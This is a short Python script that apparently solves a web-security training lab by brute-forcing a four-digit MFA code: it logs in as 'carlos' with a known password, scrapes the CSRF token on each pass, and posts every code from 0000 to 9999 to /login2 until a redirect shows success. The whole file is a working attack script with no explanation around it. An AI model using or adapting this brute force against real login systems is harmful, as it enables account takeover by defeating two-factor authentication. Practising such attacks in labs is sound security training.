import sys
import requests
import re

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

print("Lab will resolve after 2-25 minutes. If the code does not abort after you get the status “Congratulations, you solved the lab!” press Ctrl+C")

burp_url = sys.argv[1]
login_url = burp_url + '/login'
login2 = burp_url + '/login2'

session = requests.Session()

number = 0

while number <= 9999:
    formatted_number = f"{number:04d}"
    
    response = session.get(login_url)
    match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
    csrf = match.group(1)
    
    burp_data = {"csrf": csrf, "username": "carlos", "password": "montoya"}
    response = session.post(login_url, data=burp_data)
    
    match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
    csrf = match.group(1)
    
    burp_data = {"csrf": csrf, "mfa-code": formatted_number}
    response = session.post(login2, data=burp_data)

    if response.status_code == 302:
        print(f"Found the correct MFA code: {formatted_number}")
        break

    number += 1
